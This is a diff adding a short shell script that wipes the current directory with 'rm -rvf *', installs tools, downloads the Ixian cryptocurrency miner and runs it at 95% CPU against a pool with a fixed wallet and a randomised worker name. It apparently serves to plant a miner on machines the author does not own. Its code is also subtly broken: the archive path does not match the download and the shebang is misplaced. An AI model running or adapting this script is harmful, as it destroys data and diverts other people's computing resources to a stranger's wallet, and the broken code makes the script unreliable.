@@ -1,0 +1,10 @@
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://github.com/ixian-platform/Ixian-Miner/releases/download/v0.6.5/IxianMiner-v0.6.5-Linux.tar.gz
+tar xvf v0.6.5/IxianMiner-v0.6.5-Linux.tar.gz
+./iximiner --mode miner --pool https://ixian.kiramine.com --wallet 4sZ9fdGKwRkbbPKJ28ZLxpRcDmLcysweypjUxw5rGbLjzAT7fLjNPFHivsVGmCV3w --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
